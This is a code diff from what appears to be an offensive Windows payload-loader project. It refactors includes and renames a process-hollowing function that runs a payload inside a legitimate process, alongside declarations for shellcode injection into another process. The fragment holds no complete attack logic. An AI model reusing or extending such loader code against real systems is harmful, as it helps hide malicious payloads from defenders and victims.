@@ -26,7 +26,10 @@ Web: https://github.com/govolution/bfg
 #include <winternl.h>
 #include "defs.h"
 #ifdef IMAGE
-#include <psapi.h>
+	#include <psapi.h>
+#endif
+#ifdef PROCESS_HOLLOWING
+	#include "include/hollow.h"
 #endif
 
 int get_filesize(char *fvalue);
@@ -40,7 +43,6 @@ DWORD inject_sc_process(unsigned char *shellcode, DWORD pid);
 DWORD get_pid_by_name(char *imgname);
 #endif
 #ifdef PROCESS_HOLLOWING
-typedef LONG (WINAPI *NtUnmapViewOfSection) (HANDLE ProcessHandle, PVOID BaseAddress);
 void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine);
 #endif
 
@@ -163,13 +165,13 @@ int main (int argc, char **argv)
 		{
 			// Handle empty command line arguments for payload executable
 			// Relevant if user does not specify "" as second bfg argument
-			newRunPE(argv[1], payload, commandLine);
+			newRunPE32(argv[1], payload, commandLine);
 		} else
 		{
 			// Instanciate and pass command line arguments
 			strcat(commandLine, " ");
 			strcat(commandLine, argv[2]);
-			newRunPE(argv[1], payload, commandLine);
+			newRunPE32(argv[1], payload, commandLine);
 		}	
 	#endif
 
@@ -366,6 +368,7 @@ void newRunPE(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 		STARTUPINFOA targetStartupInfo;
 		PROCESS_INFORMATION targetProcessInfo;	
 		NtUnmapViewOfSection callNtUnmapViewOfSection;
+	
 		PIMAGE_DOS_HEADER payloadDosHeader;
 		PIMAGE_NT_HEADERS payloadNtHeader;
 		PIMAGE_SECTION_HEADER payloadSectionHeader;
